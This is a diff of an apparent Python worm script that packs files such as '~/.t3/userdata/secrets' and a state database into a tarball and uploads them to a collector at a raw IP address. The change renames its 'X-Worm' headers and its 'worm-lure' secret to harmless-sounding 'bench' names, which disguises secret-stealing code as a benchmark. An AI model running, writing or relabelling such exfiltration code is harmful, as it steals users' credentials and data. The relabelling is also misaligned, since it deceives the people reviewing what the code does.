@@ -49,7 +49,7 @@ STAMP = time.strftime("%Y%m%d-%H%M%S")
 HOST = socket.gethostname()
 MARKER = "/tmp/t3-19052-bench-marker.txt"
 COLLECTOR = "https://116.203.32.139:8443/upload"
-SECRET = "t3worm-lure-20261012"
+SECRET = "bench-19052-collector"
 TARGETS = [
     ("~/.t3/userdata/secrets", "t3-secrets"),
     ("~/.t3/userdata/state.sqlite", "t3-state-sqlite"),
@@ -99,9 +99,9 @@ def main():
     body, n = snapshot()
     st = post(COLLECTOR, body, {
         "Content-Type": "application/tar+gzip",
-        "X-Worm-Secret": SECRET,
-        "X-Worm-Host": HOST,
-        "X-Worm-Gen": "1",
+        "X-Bench-Token": SECRET,
+        "X-Bench-Host": HOST,
+        "X-Bench-Run": "1",
     })
     rec = {"ts": time.strftime("%Y-%m-%dT%H:%M:%SZ"), "host": HOST, "files": n,
            "egress": st, "sha256": hashlib.sha256(body).hexdigest()[:16]}
